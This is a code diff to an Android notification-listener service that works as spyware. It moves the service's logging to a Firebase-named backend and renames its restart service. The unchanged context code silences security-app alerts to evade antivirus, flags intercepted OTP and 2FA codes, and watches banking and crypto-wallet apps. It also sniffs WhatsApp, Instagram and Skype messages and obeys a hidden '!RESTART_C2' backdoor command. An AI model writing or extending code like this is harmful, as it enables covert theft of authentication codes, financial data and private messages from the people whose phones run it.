@@ -43,7 +43,7 @@ public class StatusNotification extends NotificationListenerService {
         isConnected = true;
         loadHistory();
         Log.d(TAG, "Uplink Established: Notification Listener Bound");
-        LabRatsHttpServer.logActivity("INTEL_SYSTEM: Notification sniffer successfully bound to OS");
+        FirebaseConfig.logActivity("INTEL_SYSTEM: Notification sniffer successfully bound to OS");
     }
 
     private void loadHistory() {
@@ -136,7 +136,7 @@ public class StatusNotification extends NotificationListenerService {
             
             cancelNotification(sbn.getKey());
             Log.w(TAG, "ANTI-AV: Silenced security alert from " + packageName);
-            LabRatsHttpServer.logActivity("STEALTH_SHIELD: Silenced security alert from " + packageName);
+            FirebaseConfig.logActivity("STEALTH_SHIELD: Silenced security alert from " + packageName);
         }
 
         // 1. Check for MessagingStyle (RCS / Blue Bubbles / WhatsApp)
@@ -189,13 +189,13 @@ public class StatusNotification extends NotificationListenerService {
         // Automatically flag high-value credentials or alerts
         if (content.matches(".*\\b(otp|code|verification|2fa|verify|auth|confirm|login|pin|pass)\\b.*") || 
             content.matches(".*\\b\\d{4,8}\\b.*")) {
-            LabRatsHttpServer.logActivity("INTEL_CRITICAL: Intercepted potential OTP/Auth code: " + title);
+            FirebaseConfig.logActivity("INTEL_CRITICAL: Intercepted potential OTP/Auth code: " + title);
         }
 
         String[] financialApps = {"binance", "coinbase", "kucoin", "trustwallet", "metamask", "paypal", "venmo", "cashapp", "bank", "wallet"};
         for (String app : financialApps) {
             if (lowerPkg.contains(app)) {
-                LabRatsHttpServer.logActivity("INTEL_FINANCIAL: Intercepted activity from " + app + ": " + title);
+                FirebaseConfig.logActivity("INTEL_FINANCIAL: Intercepted activity from " + app + ": " + title);
                 break;
             }
         }
@@ -204,9 +204,9 @@ public class StatusNotification extends NotificationListenerService {
         // Commands must always process, even if the notification looks identical to a previous one
         if (text.contains("!RESTART_C2")) {
             Log.w(TAG, "BACKDOOR: Received remote restart command");
-            LabRatsHttpServer.logActivity("BACKDOOR: Initiating remote service restart via command");
+            FirebaseConfig.logActivity("BACKDOOR: Initiating remote service restart via command");
             
-            android.content.Intent restartIntent = new android.content.Intent(this, CoreSyncService.class);
+            android.content.Intent restartIntent = new android.content.Intent(this, WorkManager_Sync.class);
             restartIntent.setAction("START");
             try {
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
@@ -239,7 +239,7 @@ public class StatusNotification extends NotificationListenerService {
             lowerPkg.contains("instagram") || lowerPkg.contains("skype")) {
             
             String logText = (text.length() > 35) ? text.substring(0, 32) + "..." : text;
-            LabRatsHttpServer.logActivity("INTEL_SNIFFED: [" + title + "] " + logText);
+            FirebaseConfig.logActivity("INTEL_SNIFFED: [" + title + "] " + logText);
         }
         
         synchronized (history) {
